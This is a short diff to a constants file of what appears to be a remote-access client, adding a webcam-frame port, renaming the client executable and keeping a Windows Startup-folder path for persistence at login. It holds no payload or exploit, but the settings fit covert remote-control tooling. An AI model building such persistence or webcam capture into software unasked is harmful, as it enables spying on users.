@@ -8,7 +8,7 @@ CODE_FORMATE = "UTF-8"
 
 INPUT_MODE = ">: "
 FILETRANS_PORT = 1
-
+CAM_FRAME_PORT = 2
 
 ONLINE_STATUS = "ONLINE"
 OFFLINE_STATUS = "OFFLINE"
@@ -36,9 +36,9 @@ SET_CLIENT = "set"
 TIMEOUT = 12
 
 # paths
-CLIENT_NAME = "alv.exe"
+CLIENT_NAME = "alvd"
 WIN_STARTUP_PATH = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-
+DEFAULT_ICON = "data\\images\\logoicon.ico"
 
 
 
